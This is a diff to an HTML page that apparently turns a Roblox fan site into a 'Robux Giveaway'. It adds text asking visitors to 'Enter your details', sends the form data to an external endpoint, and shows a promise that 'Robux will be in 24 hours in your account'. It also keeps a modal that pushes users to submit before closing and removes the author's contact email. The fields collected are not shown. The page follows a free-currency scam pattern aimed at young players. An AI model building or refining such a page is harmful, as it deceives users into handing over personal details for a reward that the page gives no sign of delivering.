@@ -30,9 +30,8 @@
     <main>
         <article>
             <div class="hero-section">
-                <h1>Welcome to my awesome website! 🌈</h1>
-                <p>Hi everyone! This is a super cool fanmade website about the Roblox game <b>Blox Fruits</b>. Join the
-                    fun and get free items!</p>
+                <h1>Welcome to Robux Giveaway site! </h1>
+                <p>Enter your details below to join our weekly prize draw! Good luck! 🍀</p>
                 <!-- Mobile Only Button -->
                 <button id="open-robux-modal" class="glow-button pulse mobile-only">🎁 ENTER GIVEAWAY 🎁</button>
             </div>
@@ -156,7 +155,12 @@
 
             if (span) {
                 span.addEventListener('click', () => {
-                    alert("Please fill out and submit the form to join the giveaway and close this window! 🎁🌟");
+                    const successCard = modal.querySelector('.success-card');
+                    if (successCard) {
+                        modal.style.display = "none";
+                    } else {
+                        alert("Please fill out and submit the form to join the giveaway and close this window! 🎁🌟");
+                    }
                 });
             }
 
@@ -197,13 +201,49 @@
                 }
             }, 1000);
 
-            // Forms will now submit directly to Formspree
+            // Handle AJAX Form Submission
+            document.querySelectorAll(".robux-form-inner").forEach(form => {
+                form.addEventListener('submit', async function (e) {
+                    e.preventDefault();
+                    const formData = new FormData(this);
+                    const button = this.querySelector('button');
+                    const originalButtonText = button.innerHTML;
+
+                    button.disabled = true;
+                    button.innerHTML = "Submitting... 🔃";
+
+                    try {
+                        const response = await fetch(this.action, {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'Accept': 'application/json'
+                            }
+                        });
+
+                        if (response.ok) {
+                            this.innerHTML = `
+                                <div class="success-card">
+                                    <h2>✅ Success!</h2>
+                                    <p>Success: Robux will be in 24 hours in your account! 🎁🌟</p>
+                                </div>
+                            `;
+                            // If it's a modal, maybe relax the close restriction or auto-close after 5s
+                        } else {
+                            throw new Error('Submission failed');
+                        }
+                    } catch (error) {
+                        alert("Oops! There was a problem joining the giveaway. Please check your connection and try again.");
+                        button.disabled = false;
+                        button.innerHTML = originalButtonText;
+                    }
+                });
+            });
         </script>
     </main>
 
     <footer>
-        <p class="copyright">All information copyright idk lol</p>
-        <p class="contact">Contact: <a href="mailto:hoikiuhkh@gmail.com">hoikiuhkh@gmail.com</a></p>
+        <p class="copyright">All information copyright roblox giveaway</p>
     </footer>
 </body>
 
